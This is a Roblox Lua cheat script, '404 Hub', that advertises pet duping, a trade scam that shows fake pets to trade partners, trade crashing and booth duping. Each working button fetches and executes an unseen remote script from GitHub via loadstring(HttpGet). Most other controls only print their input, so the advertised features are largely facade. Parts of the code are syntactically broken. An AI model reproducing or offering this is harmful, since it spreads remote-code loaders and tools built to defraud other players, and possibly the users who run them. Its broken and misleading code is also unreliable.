local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "[✨SHINY] UPDATE - PSX PRIVATE V4.0", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

local Tab = Window:MakeTab({
        Name = "Info",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
    
    local Section = Tab:AddSection({
        Name = "Credits"
    })
    
    Tab:AddParagraph("Made By 404 team","Owner K4F#9595")
    
   local Section = Tab:AddSection({
        Name = "Status"   
     })
     
   Tab:AddParagraph("DUPE: Working!","")
   
   Tab:AddParagraph("TRADE SCAM: Working!","")

   Tab:AddParagraph("BOOTH DUPING: Working!","")
 
   local Section = Tab:AddSection({
        Name = "Update"   
     })
   
   Tab:AddParagraph("[✨SHINY] UPDATE!","Version 4.0!")

         
      local Tab = Window:MakeTab({
        Name = "Dupe",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
  
    
    local Section = Tab:AddSection({
        Name = "Dupe Section"
    })
    
    
    Tab:AddButton({
        Name = "Start Dupe!",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/info.lua"))()
          end    
    })
    
    local Section = Tab:AddSection({
	Name = "Dupe Options"
})
     
     Tab:AddSlider({
	Name = "Select Pets Limits",
	Min = 0,
	Max = 20,
	Default = 5,
	Color = Color3.fromRGB(254,255,255),
	Increment = 1,
	ValueName = "PETS",
	Callback = function(Value)
		print(Value)
	end    
})
     
    Tab:AddToggle({
	Name = "Dupe Gems",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
}) 

Tab:AddToggle({
	Name = "Dupe Equipped Pets",
	Default = false,
	Callback = function(Value)
		print(Value)
	end    
}) 

     Tab:AddTextbox({
        Name = "Rename all pets",
        Default = "Text Goes here",
        TextDisappear = true,
        Callback = function(Value)
            print(Value)
        end	  
    })
  
    local Tab = Window:MakeTab({
        Name = "Trade Scam",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
    
    Tab:AddLabel("Make sure that your in trade before enabled Trade Scam")

    local Section = Tab:AddSection({
	Name = "ON/OFF"
    })

    Tab:AddButton({
        Name = "ON",
        Default = false,
        Callback = function(Value)
             loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/info.lua"))()
        end    
    })

    Tab:AddButton({
        Name = "OFF",
        Default = false,
        Callback = function(Value)
             print("button pressed")
        end    
    })

    local Section = Tab:AddSection({
	Name = "Trades Options"
    })

    Tab:AddTextbox({
	Name = "Fake Pets Input",
	Default = "Input name of Pet",
	TextDisappear = true,
	Callback = function(Value)
		print(Value)
	end	  
})
  
  Tab:AddButton({
	Name = "Crash Player Trade",
	Callback = function()
      		print("button pressed")
  	end    
})

local Tab = Window:MakeTab({
        Name = "Booth Duping",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
Name = "How to use"
    })

 Tab:AddParagraph("You need to make a pet in your booth the click ON if someone buys It" , "you will get the gems and the pet will still be in your" , "inventory")

local Section = Tab:AddSection({
	Name = "ON/OFF"
    })

    Tab:AddButton({
        Name = "ON",
        Default = false,
        Callback = function(Value)
             loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/info.lua"))()
        end    
    })

    Tab:AddButton({
        Name = "OFF",
        Default = false,
        Callback = function(Value)
             print("button pressed")
        end    
    })

Name = "How to use"
    })

Tab:AddParagraph("In This Section Everything you buy will be free and you both" , "will get the gems But you can't buy something that worths 1B" , "and you only have like 100M" )

local Section = Tab:AddSection({
	
Name = "ON/OFF"
    })

    Tab:AddButton({
        Name = "ON",
        Default = false,
        Callback = function(Value)
             loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/info.lua"))()
        end    
    })

    Tab:AddButton({
        Name = "OFF",
        Default = false,
        Callback = function(Value)
             print("button pressed")
        end    
    })

    Tab:AddParagraph("More Coming Soon!","See you in the feture!")
    
    local Tab = Window:MakeTab({
	Name = "Bank",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
    
    local Section = Tab:AddSection({
	Name = "Bank Section"
})
 
    Tab:AddButton({
	Name = "💵 Open Bank",
	Callback = function()
      		print("button pressed")
  	end    
})
    
    
    Tab:AddButton({
	Name = "❌ Cancel Outgoing Invites!",
	Callback = function()
      		print("button pressed")
  	end    
})
 
     local Section = Tab:AddSection({
	Name = "Anti-Scam"
})
     
     Tab:AddParagraph("Anti-Scam","Coming Soon!")
    

    
        OrionLib:MakeNotification({
	Name = "Thanks for using 404 Hub!",
	Content = "Version 4.0",
	Image = "rbxassetid://4483345998",
	Time = 5
})


OrionLib:Init()

